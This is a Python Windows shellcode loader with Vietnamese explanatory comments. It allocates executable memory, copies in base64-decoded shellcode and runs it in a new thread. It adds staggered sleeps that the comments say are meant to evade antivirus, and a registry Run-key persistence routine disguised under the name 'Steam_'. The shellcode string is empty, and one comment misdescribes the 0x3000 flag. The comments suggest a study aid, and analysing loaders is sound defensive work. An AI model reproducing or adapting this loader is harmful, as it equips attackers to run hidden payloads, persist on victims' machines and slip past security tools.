import ctypes # thư viện này giúp chúng ta tương tác với các hàm của windows
import time
import winreg # thư viện này giúp truy cập vào registry của windows
import sys
import os
import subprocess
import base64
from ctypes.wintypes import wintypes as CHead 
SHSH =""
# Kiểm tra xem giá trị Steam_ có trong registry không
def Checker():
    REG_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" # đường dẫn lưu trữ các chương trình tự động chạy khi khởi động
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(registry_key, "Steam_") # kiểm tra xem có key "Steam_" trong registry không
        winreg.CloseKey(registry_key)
        return True
            #return value
    except WindowsError:
        return False
            #return None
def P():
    Final_Location = os.path.dirname(sys.argv[0]).replace("/", "\\") + "\\" + os.path.basename(sys.argv[0]) # lấy đường dẫn của file hiện tại - chuyển đổi đường dẫn về định dạng windows 
    try:    
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /t REG_SZ /d "'.format("Steam_") + Final_Location + '"', shell=True) 
        # thêm key "Steam_" vào registry với giá trị là đường dẫn của file hiện tại - Persistance 
        # Mục đích là để chương trình tự động chạy khi khởi động
    except:  # bỏ qua lỗi nếu có 
        pass
def main():
    try:
        ELES = ctypes.windll.kernel32 # tương tác với các hàm của kernel32.dll 
        ELES.VirtualAlloc.argtypes = (CHead.LPVOID, ctypes.c_size_t, CHead.DWORD, CHead.DWORD)  # khai báo kiểu dữ liệu cho các tham số của hàm VirtualAlloc
        # hàm VirtualAlloc sẽ cấp phát một vùng nhớ mới trong bộ nhớ của chương trình 
        ELES.VirtualAlloc.restype = CHead.LPVOID # hàm VirtualAlloc sẽ trả về một con trỏ kiểu LPVOID 
        time.sleep(69) # tạm dừng chương trình 69 giây
        time.sleep(13) # tạm dừng chương trình 13 giây 
        # mục đích của việc tạm dừng chương trình là để tránh việc bị phát hiện bởi AV - vì có thời gian timeout ngắn 
        ELES.CreateRemoteThread.argtypes = (CHead.HANDLE, CHead.LPVOID, ctypes.c_size_t, CHead.LPVOID, CHead.LPVOID, CHead.DWORD, CHead.LPVOID) # khai báo kiểu dữ liệu cho các tham số của hàm CreateRemoteThread
        ELES.CreateThread.restype = CHead.HANDLE # hàm CreateRemoteThread sẽ trả về một HANDLE  
        # hàm CreateRemoteThread sẽ tạo một luồng mới trong một tiến trình khác 
        time.sleep(13)
        ELES.RtlMoveMemory.argtypes = (CHead.LPVOID, CHead.LPVOID, ctypes.c_size_t) # khai báo kiểu dữ liệu cho các tham số của hàm RtlMoveMemory
        ELES.RtlMoveMemory.restype = CHead.LPVOID # hàm RtlMoveMemory sẽ trả về một con trỏ kiểu LPVOID
        # hàm RtlMoveMemory sẽ sao chép dữ liệu vào vùng nhớ được cấp phát  
        time.sleep(13)
        ELES.WaitForSingleObject.argtypes = (CHead.HANDLE, CHead.DWORD) # khai báo kiểu dữ liệu cho các tham số của hàm WaitForSingleObject 
        ELES.WaitForSingleObject.restype = CHead.DWORD 
        # hàm WaitForSingleObject sẽ chờ cho đến khi một tiến trình hoặc luồng hoàn thành 
        #memoryaddr = kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)
        time.sleep(69)
        MAS = ELES.VirtualAlloc(None, len(base64.b64decode(SHSH.encode())), 0x3000, 0x40)  
        # cấp phát một vùng nhớ mới với kích thước bằng với kích thước của shellcode 
        # None : Windows tự động chọn vùng nhớ
        # len(base64.b64decode(SHSH.encode())) : kích thước của shellcode 
        # 0x3000 : quyền truy cập vùng nhớ - quyền đọc và viết
        # 0x40 : vùng nhớ sẽ được cấp phát và có thể thực thi
        time.sleep(13)
        # kernel32.RtlMoveMemory(memoryaddr, buf, len(buf))
        ELES.RtlMoveMemory(MAS, base64.b64decode(SHSH.encode()),len(base64.b64decode(SHSH.encode())))  # sao chép shellcode vào vùng nhớ được cấp phát
        time.sleep(47) 
        thrd2 = ELES.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(MAS), ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
        # Tạo một luồng mới chạy shell code đã nạp vào MAS  - Giúp mã độc thực thi trực tiêp trong bộ nhớ , trán ghi ra ổ đĩa để tránh bị phát hiện 
        time.sleep(69)
        ELES.WaitForSingleObject(thrd2, -1) # chờ cho đến khi luồng thrd2 hoàn thành - tức shellcode hoàn thành 
    except Exception as error:
        pass
if __name__ == "__main__":
    #P()
    #f=open("Base64DInvokePAMSI_ETW_ShellCode.txt","w")
    #f.write(base64.b64encode(buf).decode())
    time.sleep(27)
    #if(not Checker()):
        #P()
    #print("Done")
    time.sleep(13)
    time.sleep(13)
    main()